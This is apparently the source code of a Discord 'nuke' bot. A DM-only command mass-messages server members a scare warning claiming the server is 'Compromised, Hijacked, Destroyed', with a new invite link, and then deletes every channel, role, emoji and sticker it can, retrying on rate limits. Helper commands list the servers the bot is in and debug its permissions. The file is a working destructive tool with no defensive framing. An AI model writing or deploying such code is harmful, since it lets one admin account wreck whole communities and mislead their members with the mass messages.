import discord
from discord.ext import commands
import os
import asyncio
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Bot setup with ALL necessary intents
intents = discord.Intents.all()  # Using all intents to eliminate any permission issues

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')
    print(f'Bot ID: {bot.user.id}')
    print(f'Bot is in {len(bot.guilds)} servers')
    for guild in bot.guilds:
        print(f'  - {guild.name} ({guild.id})')

@bot.command(name='debug')
async def debug_server(ctx, server_id: int = None):
    """Debug server info (DM only)"""
    
    if ctx.guild is not None:
        await ctx.send("Use this command in DM only.")
        return
    
    if server_id is None:
        await ctx.send("Need server ID.")
        return
    
    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.send("Server not found.")
        return
    
    # Check user permissions
    member = guild.get_member(ctx.author.id)
    if member is None:
        await ctx.send("You're not in that server.")
        return
    
    # Get bot member and permissions
    bot_member = guild.me
    
    debug_info = f"**DEBUG INFO for {guild.name}**\n"
    debug_info += f"Guild ID: {guild.id}\n"
    debug_info += f"User is admin: {member.guild_permissions.administrator}\n"
    debug_info += f"Bot has admin: {bot_member.guild_permissions.administrator}\n"
    debug_info += f"Bot permissions: {bot_member.guild_permissions.value}\n"
    debug_info += f"Bot role position: {bot_member.top_role.position}\n"
    debug_info += f"Bot highest role: {bot_member.top_role.name}\n"
    debug_info += f"Total channels: {len(guild.channels)}\n"
    debug_info += f"Total roles: {len([r for r in guild.roles if r.name != '@everyone'])}\n"
    
    await ctx.send(debug_info)

@bot.command(name='simple')
async def simple_delete(ctx, server_id: int = None):
    """Simple deletion test (DM only)"""
    
    if ctx.guild is not None:
        await ctx.send("Use this command in DM only.")
        return
    
    if server_id is None:
        await ctx.send("Need server ID.")
        return
    
    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.send("Server not found.")
        return
    
    # Check user permissions
    member = guild.get_member(ctx.author.id)
    if member is None or not member.guild_permissions.administrator:
        await ctx.send("No admin perms.")
        return
    
    await ctx.send("Starting simple deletion test...")
    print(f"Starting deletion test for {guild.name}")
    
    # Try to delete just one channel first
    test_channel = None
    for channel in guild.channels:
        if isinstance(channel, discord.TextChannel):
            test_channel = channel
            break
    
    if test_channel:
        try:
            print(f"Attempting to delete channel: {test_channel.name}")
            await test_channel.delete()
            await ctx.send(f"Successfully deleted channel: {test_channel.name}")
            print(f"Successfully deleted channel: {test_channel.name}")
        except discord.Forbidden as e:
            error_msg = f"Forbidden error: {e}"
            print(error_msg)
            await ctx.send(error_msg)
        except discord.HTTPException as e:
            error_msg = f"HTTP error: {e}"
            print(error_msg)
            await ctx.send(error_msg)
        except Exception as e:
            error_msg = f"Unexpected error: {e}"
            print(error_msg)
            await ctx.send(error_msg)
    else:
        await ctx.send("No text channels found to test with.")

@bot.command(name='c')
async def purge_by_id(ctx, server_id: int = None):
    """Purge server by ID (DM only)"""
    
    print(f"Command 'c' called by {ctx.author.name} ({ctx.author.id}) with server_id: {server_id}")
    
    if ctx.guild is not None:
        print("Command not used in DM, ignoring")
        return
    
    if server_id is None:
        await ctx.send("Need server ID.")
        return
    
    guild = bot.get_guild(server_id)
    if guild is None:
        await ctx.send("Server not found.")
        print(f"Server {server_id} not found in bot's guild list")
        print(f"Available guilds: {[g.id for g in bot.guilds]}")
        return
    
    print(f"Found server: {guild.name} ({guild.id})")
    
    # Check if user has admin perms in that server
    member = guild.get_member(ctx.author.id)
    if member is None:
        await ctx.send("You're not in that server.")
        print(f"User {ctx.author.name} not found in server {guild.name}")
        return
    
    if not member.guild_permissions.administrator:
        await ctx.send("No admin perms in that server.")
        print(f"User {ctx.author.name} doesn't have admin perms in {guild.name}")
        return
    
    print(f"User has admin perms, starting purge...")
    await ctx.send("Starting purge...")
    
    # Get counts
    channels = list(guild.channels)
    roles = [r for r in guild.roles if r.name != "@everyone" and not r.managed]
    emojis = list(guild.emojis)
    stickers = list(guild.stickers)
    
    print(f"Found {len(channels)} channels, {len(roles)} roles, {len(emojis)} emojis, {len(stickers)} stickers")
    
    # DM warning to all members
    dm_count = 0
    print("Starting DM phase...")
    try:
        # Find first text channel to create invite
        text_channel = None
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                text_channel = channel
                break
        
        # Create invite link
        invite_link = "No invite available"
        if text_channel:
            try:
                invite = await text_channel.create_invite(max_age=0, max_uses=0)
                invite_link = invite.url
                print(f"Created invite: {invite_link}")
            except Exception as e:
                print(f"Failed to create invite: {e}")
        
        # Get bot's highest role position
        bot_member = guild.me
        bot_role_position = bot_member.top_role.position if bot_member else 0
        
        # DM all members except those with roles higher than bot
        warning_msg = f"🚨 **LEAVE THIS SERVER** 🚨\n\n**Backup invite:** {invite_link}\n\n**THIS SERVER IS:** Compromised, Corrupted, Under Attack, Being Purged, Unsafe, Hijacked, Destroyed"
        
        for member in guild.members:
            try:
                # Skip bots and members with roles higher than bot
                if member.bot:
                    continue
                
                member_role_position = member.top_role.position if member.top_role else 0
                if member_role_position >= bot_role_position:
                    print(f"Skipping {member.name} - higher role position ({member_role_position} >= {bot_role_position})")
                    continue
                
                # Send DM
                await member.send(warning_msg)
                dm_count += 1
                print(f"DMed {member.name} ({dm_count} total)")
                await asyncio.sleep(0.5)  # Rate limit for DMs
                
            except discord.Forbidden:
                print(f"Cannot DM {member.name} - DMs disabled")
            except Exception as e:
                print(f"Failed to DM {member.name}: {e}")
        
        print(f"Sent DMs to {dm_count} members")
        
        # Small delay before starting destruction
        await asyncio.sleep(2)
        
    except Exception as e:
        print(f"Error in DM section: {e}")
    
    # Delete channels
    deleted_channels = 0
    print("Starting channel deletion...")
    for i, channel in enumerate(channels):
        try:
            print(f"Deleting channel {i+1}/{len(channels)}: {channel.name} ({type(channel).__name__})")
            await channel.delete()
            deleted_channels += 1
            print(f"  ✓ Deleted successfully")
            await asyncio.sleep(1)  # Conservative delay
        except discord.Forbidden as e:
            print(f"  ✗ Forbidden: {e}")
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = int(e.response.headers.get('Retry-After', 5))
                print(f"  ⏸ Rate limited, waiting {retry_after} seconds")
                await asyncio.sleep(retry_after + 1)
                try:
                    await channel.delete()
                    deleted_channels += 1
                    print(f"  ✓ Deleted after retry")
                except Exception as retry_e:
                    print(f"  ✗ Failed retry: {retry_e}")
            else:
                print(f"  ✗ HTTP error: {e}")
        except Exception as e:
            print(f"  ✗ Unexpected error: {e}")
    
    print(f"Deleted {deleted_channels}/{len(channels)} channels")
    
    # Delete roles
    deleted_roles = 0
    bot_member = guild.me
    print("Starting role deletion...")
    await asyncio.sleep(3)  # Break between operations
    
    for role in roles:
        try:
            if bot_member.top_role.position > role.position:
                print(f"Deleting role: {role.name} (pos: {role.position})")
                await role.delete()
                deleted_roles += 1
                print(f"  ✓ Deleted successfully")
                await asyncio.sleep(2)  # Longer delay for roles
            else:
                print(f"  ✗ Cannot delete {role.name} - hierarchy (bot: {bot_member.top_role.position}, role: {role.position})")
        except discord.Forbidden as e:
            print(f"  ✗ Forbidden: {e}")
        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = int(e.response.headers.get('Retry-After', 5))
                print(f"  ⏸ Rate limited, waiting {retry_after} seconds")
                await asyncio.sleep(retry_after + 1)
                try:
                    await role.delete()
                    deleted_roles += 1
                    print(f"  ✓ Deleted after retry")
                except Exception as retry_e:
                    print(f"  ✗ Failed retry: {retry_e}")
            else:
                print(f"  ✗ HTTP error: {e}")
        except Exception as e:
            print(f"  ✗ Unexpected error: {e}")
    
    print(f"Deleted {deleted_roles}/{len(roles)} roles")
    
    # Delete emojis
    deleted_emojis = 0
    print("Starting emoji deletion...")
    await asyncio.sleep(3)
    
    for emoji in emojis:
        try:
            print(f"Deleting emoji: {emoji.name}")
            await emoji.delete()
            deleted_emojis += 1
            print(f"  ✓ Deleted successfully")
            await asyncio.sleep(1)
        except Exception as e:
            print(f"  ✗ Error: {e}")
    
    # Delete stickers
    deleted_stickers = 0
    print("Starting sticker deletion...")
    await asyncio.sleep(3)
    
    for sticker in stickers:
        try:
            print(f"Deleting sticker: {sticker.name}")
            await sticker.delete()
            deleted_stickers += 1
            print(f"  ✓ Deleted successfully")
            await asyncio.sleep(1)
        except Exception as e:
            print(f"  ✗ Error: {e}")
    
    result = f"Purge completed:\n{deleted_channels}/{len(channels)} channels\n{deleted_roles}/{len(roles)} roles\n{deleted_emojis}/{len(emojis)} emojis\n{deleted_stickers}/{len(stickers)} stickers\nDMed {dm_count} members"
    print(result)
    await ctx.send(result)

@bot.command(name='servers')
async def list_servers(ctx):
    """List all servers the bot is in (DM only)"""
    
    if ctx.guild is not None:
        return
    
    servers = []
    for guild in bot.guilds:
        member = guild.get_member(ctx.author.id)
        has_perms = member is not None and member.guild_permissions.administrator
        servers.append(f"{guild.name} ({guild.id}) {'✓' if has_perms else '✗'}")
    
    if servers:
        await ctx.send("Servers:\n" + "\n".join(servers))
    else:
        await ctx.send("No servers.")

# Run the bot
if __name__ == "__main__":
    TOKEN = os.getenv('DISCORD_TOKEN')
    if TOKEN:
        print("Starting bot...")
        bot.run(TOKEN)
    else:
        print("No token found in environment variables.")
